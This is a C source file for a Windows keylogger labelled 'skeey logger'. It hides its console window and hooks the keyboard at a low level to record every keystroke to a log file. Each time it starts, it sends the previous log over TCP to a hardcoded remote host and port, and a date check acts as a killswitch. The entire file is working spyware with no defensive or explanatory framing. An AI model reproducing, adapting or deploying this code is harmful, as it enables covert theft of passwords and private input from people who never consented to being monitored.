// skeey logger

//#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <shlwapi.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
//advapi32 is for the fileflush winapi function
//#pragma comment (lib, "Ws2_32.lib")
//#pragma comment (lib, "Mswsock.lib")
//#pragma comment (lib, "AdvApi32.lib")
//#pragma comment (lib, "Shlwapi.lib")

#define DEFAULT_BUFLEN 512

HHOOK _hook;
HANDLE thread;
HANDLE hFile;
KBDLLHOOKSTRUCT kbdstruct;
UINT vkr;
char *sendbuf;
size_t bytes_read = 0;
long long int z = 0;
char c;
char x = '~';
errno_t err = 0;
BOOL lastKeyStateDown = FALSE;
BOOL ret = FALSE;
FILE *f;

// send data function
int sendLog(const char SERVER_NAME[], const char SERVER_PORT[])
{
	hFile = CreateFileA("log.dat",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) { return 1; }

	//getfilesizeex
	LARGE_INTEGER fileLen;
	GetFileSizeEx(hFile, &fileLen);

	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult = 0;
	int recvbuflen = DEFAULT_BUFLEN;

	// initialize winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) { return 2; }

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// resolve server address and port
	iResult = getaddrinfo(SERVER_NAME, SERVER_PORT, &hints, &result);
	if (iResult != 0)
	{
		WSACleanup();
		CloseHandle(hFile);
		return 3;
	}

	// attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		// create a socket for connecting to a server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{
			WSACleanup();
			CloseHandle(hFile);
			return 4;
		}

		// connect to the server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult != 0)
		{
			WSACleanup();
			CloseHandle(hFile);
			return 5;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET)
	{
		WSACleanup();
		CloseHandle(hFile);
		return 6;
	}

	// convert file size to string
	/*this works but we will not use for now
	std::string fileSizeLengthString = std::to_string(fileLen.QuadPart);

	// send file size
	iResult = send(ConnectSocket, fileSizeLengthString.c_str(), sizeof(fileSizeLengthString.c_str()), 0);
	if (iResult == SOCKET_ERROR)
	{
		closesocket(ConnectSocket);
		WSACleanup();
		return 7;
	}*/

	Sleep(300);

	// send the file
	// returns TRUE on success

	// send the file
	ret = TransmitFile(ConnectSocket,
		hFile,
		(DWORD)fileLen.QuadPart,
		0,//0= default transfer size
		NULL,
		NULL,
		TF_DISCONNECT);

	if (ret != TRUE)
	{
		closesocket(ConnectSocket);
		WSACleanup();
		CloseHandle(hFile);
		return 8;
	}

	// shutdown the connection
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		closesocket(ConnectSocket);
		WSACleanup();
		CloseHandle(hFile);
		return 9;
	}

	// receive until the peer closes the connection
	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
	} while (iResult > 0);

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();
	CloseHandle(hFile);
	return 0;
}

// fileFlush thread
DWORD WINAPI fileFlush(void *data)
{
	while (1)
	{
		Sleep(20000);
		fflush(f);
	}

	return 0;
}

// hook callback function
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	kbdstruct = *((KBDLLHOOKSTRUCT*)lParam);
	vkr = MapVirtualKey(kbdstruct.vkCode, MAPVK_VK_TO_CHAR);
	if (nCode >= 0 && kbdstruct.flags == 128 && vkr < 256 && vkr > 33){
		fprintf(f, "%c", vkr);
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int main(void)
{
	// hide console window
	FreeConsole();

	int bRet = 0;
	const char host[] = "192.168.10.122";
	const char port[] = "8080";

	// dead man killswitch
	SYSTEMTIME st;
	GetSystemTime(&st);
	int stopYear = 2021;
	if (st.wYear > stopYear)
	{
		return -2;
	}

	// sleep a few seconds to wait for network
	Sleep(20000);

	// open logfile or create if not exists
	err = fopen_s(&f, "log.dat", "a");
	if (err != 0) { return -3; }
	fclose(f);

	// send log function
	bRet = sendLog(host, port);
	/*
	if (bRet != 0)
	{
		if (bRet == 1)
		{
			return bRet;
		}
		else {
			CloseHandle(hFile);
		}
		return bRet;
	}*/

	// create new log file
	err = fopen_s(&f, "log.dat", "w");
	if (err != 0) { return -4; }

	// set the keyboard hook
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		fclose(f);
		return -5;
	}

	// create the fflush thread
	thread = CreateThread(NULL, 0, fileFlush, NULL, 0, NULL);
	if (thread == NULL)
	{
		fclose(f);
		return -6;
	}

	// create windows message pump
	MSG msg;
	while ((bRet = GetMessage(&msg, NULL, 0, 0))) {}

	fclose(f);
	return 0;
}
